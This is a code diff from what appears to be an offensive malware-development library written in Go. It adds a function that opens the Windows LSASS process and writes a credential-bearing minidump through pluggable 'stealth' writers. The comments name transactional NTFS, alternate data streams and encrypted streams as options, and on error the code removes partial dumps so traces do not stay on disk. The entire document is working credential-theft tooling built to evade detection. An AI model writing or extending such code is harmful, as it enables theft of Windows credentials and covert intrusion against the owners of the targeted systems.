@@ -14,6 +14,7 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 	"github.com/oioio-space/maldev/process/enum"
 	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
@@ -146,23 +147,44 @@ func Dump(h uintptr, w io.Writer, caller *wsyscall.Caller) (Stats, error) {
 }
 
 // DumpToFile opens lsass, dumps to path with 0o600, closes the handle on
-// any outcome, and syncs to disk before returning.
+// any outcome, and syncs to disk before returning. Equivalent to
+// [DumpToFileVia] with a nil Creator.
 func DumpToFile(path string, caller *wsyscall.Caller) (Stats, error) {
+	return DumpToFileVia(nil, path, caller)
+}
+
+// DumpToFileVia opens lsass and writes the minidump through the
+// operator-supplied [stealthopen.Creator]. nil falls back to a
+// [stealthopen.StandardCreator] (plain os.OpenFile) — same byte
+// content as [DumpToFile]. Use a non-nil Creator to land the dump
+// through transactional NTFS, an encrypted-stream wrapper, ADS, or
+// any other operator-controlled write primitive — symmetric to the
+// read-side [stealthopen.Opener] threaded through the eprocess
+// discovery helpers.
+//
+// On any error the path is removed (best-effort) so partial dumps
+// don't leak on disk.
+func DumpToFileVia(creator stealthopen.Creator, path string, caller *wsyscall.Caller) (Stats, error) {
 	h, err := OpenLSASS(caller)
 	if err != nil {
 		return Stats{}, err
 	}
 	defer CloseLSASS(h) //nolint:errcheck
 
-	f, err := os.OpenFile(path, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
+	wc, err := stealthopen.UseCreator(creator).Create(path)
 	if err != nil {
 		return Stats{}, fmt.Errorf("open %q: %w", path, err)
 	}
-	stats, dumpErr := Dump(h, f, caller)
-	if syncErr := f.Sync(); syncErr != nil && dumpErr == nil {
-		dumpErr = syncErr
+	stats, dumpErr := Dump(h, wc, caller)
+	// Best-effort sync — only StandardCreator returns *os.File. Custom
+	// Creators routing through transactional NTFS / ADS / encrypted
+	// streams may have their own commit semantics on Close.
+	if f, ok := wc.(*os.File); ok {
+		if syncErr := f.Sync(); syncErr != nil && dumpErr == nil {
+			dumpErr = syncErr
+		}
 	}
-	if closeErr := f.Close(); closeErr != nil && dumpErr == nil {
+	if closeErr := wc.Close(); closeErr != nil && dumpErr == nil {
 		dumpErr = closeErr
 	}
 	if dumpErr != nil {
